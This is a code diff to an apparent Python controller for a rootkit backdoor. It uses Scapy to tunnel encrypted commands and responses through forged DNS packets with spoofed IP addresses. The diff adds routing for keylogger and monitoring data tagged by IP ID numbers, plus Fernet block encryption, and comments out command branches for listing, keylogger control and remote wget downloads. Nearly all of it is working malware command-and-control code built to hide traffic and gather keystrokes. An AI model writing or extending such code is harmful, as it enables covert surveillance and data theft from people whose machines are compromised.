@@ -52,13 +52,18 @@ CONTROLLER_IP = ARGS.controller_ip
 ROOTKIT_IP = ARGS.rootkit_ip
 NETWORK_INTERFACE = ARGS.interface
 QUEUE = SimpleQueue()
-ENCRYPTION_HANDLER = StreamEncryption()
+STREAM_ENCRYPTION_HANDLER = StreamEncryption()
+BLOCK_ENCRYPTION_HANDLER = BlockEncryption()
+MONITOR_IDENTIFICATION = 14562
+KEYLOG_IDENTIFICATION = 32586
+GENERAL_MSG_IDENTIFICATION = 19375
 
 
 # Initialize the encryption context.
-ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
-ENCRYPTION_HANDLER.read_secret("data/secret.key")
-ENCRYPTION_HANDLER.initialize_encryption_context()
+STREAM_ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
+STREAM_ENCRYPTION_HANDLER.read_secret("data/secret.key")
+STREAM_ENCRYPTION_HANDLER.initialize_encryption_context()
+BLOCK_ENCRYPTION_HANDLER.read_key("data/fernet.key")
 
 
 def subprocess_packet_handler(pkt):
@@ -67,18 +72,23 @@ def subprocess_packet_handler(pkt):
     """
     if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
         return None
-    # 1. Get the data in the TXT record.
-    encrypted_message = pkt[UDP].ar.rdata[0]
-    # 2. Put the data in the queue.
-    QUEUE.put(encrypted_message)
-    # 3. Craft a legit query.
-    forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
-    # 4. sr1 the DNS query to a legit DNS server.
-    response = sr1(forged, verbose=0)
-    # 5. send the response back to the backdoor machine.
-    response[IP].src = f"{CONTROLLER_IP}"
-    response[IP].dst = f"{ROOTKIT_IP}"
-    send(response, verbose=0)
+    if pkt[IP].id == GENERAL_MSG_IDENTIFICATION:
+        # 1. Get the data in the TXT record.
+        encrypted_message = pkt[UDP].ar.rdata[0]
+        # 2. Put the data in the queue.
+        QUEUE.put(encrypted_message)
+        # 3. Craft a legit query.
+        forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
+        # 4. sr1 the DNS query to a legit DNS server.
+        response = sr1(forged, verbose=0)
+        # 5. send the response back to the backdoor machine.
+        response[IP].src = f"{CONTROLLER_IP}"
+        response[IP].dst = f"{ROOTKIT_IP}"
+        send(response, verbose=0)
+    if pkt[IP].id == KEYLOG_IDENTIFICATION:
+        write_keylog_data(encrypted_message)
+    if pkt[IP].id == MONITOR_IDENTIFICATION:
+        write_monitor_data(encrypted_message)
 
 
 def subprocess_start():
@@ -97,7 +107,7 @@ def send_udp(data: str):
     """
     data = data.encode("utf-8")
     # Encrypt the data.
-    data = ENCRYPTION_HANDLER.encrypt(data)
+    data = STREAM_ENCRYPTION_HANDLER.encrypt(data)
     # Forge the UDP packet.
     pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{ROOTKIT_IP}")/UDP(sport=10069, dport=10420, len=len(data))
     pkt[UDP].payload = Raw(data)
@@ -114,14 +124,10 @@ def receive_single_response():
             continue
         else:
             encrypted = QUEUE.get()
-            decrypted = ENCRYPTION_HANDLER.decrypt(encrypted)
+            decrypted = STREAM_ENCRYPTION_HANDLER.decrypt(encrypted)
             print(f"Response: {decrypted.decode('utf-8')}")
             return
     print("Timed out waiting for response...")
-
-
-def transfer_file():
-    pass
 
 
 if __name__ == "__main__":
@@ -152,26 +158,26 @@ if __name__ == "__main__":
                 break
         if argc == 2:
             data = argv[0] + " " + argv[1]
-            if argv[0] == LIST:
-                send_udp(data)
-                receive_single_response()
-                continue
-            if argv[0] == KEYLOGGER:
-                if argv[1] in [START, STOP, TRANSFER]:
-                    send_udp(data)
-                continue
+            # if argv[0] == LIST:
+            #     send_udp(data)
+            #     receive_single_response()
+            #     continue
+            # if argv[0] == KEYLOGGER:
+            #     if argv[1] in [START, STOP, TRANSFER]:
+            #         send_udp(data)
+            #     continue
             if argv[0] == WATCH:
                 send_udp(data)
                 receive_single_response()
                 continue
-        if argc == 3:
-            if argv[0] == WGET:
-                url = argv[1]
-                filepath = argv[2]
-                data = argv[0] + " " + argv[1] + " " + argv[2]
-                send_udp(data)
-                receive_single_response()
-                continue
+        # if argc == 3:
+        #     if argv[0] == WGET:
+        #         url = argv[1]
+        #         filepath = argv[2]
+        #         data = argv[0] + " " + argv[1] + " " + argv[2]
+        #         send_udp(data)
+        #         receive_single_response()
+        #         continue
         else:
             print(f"Invalid Command: {command}")
     decode_process.kill()
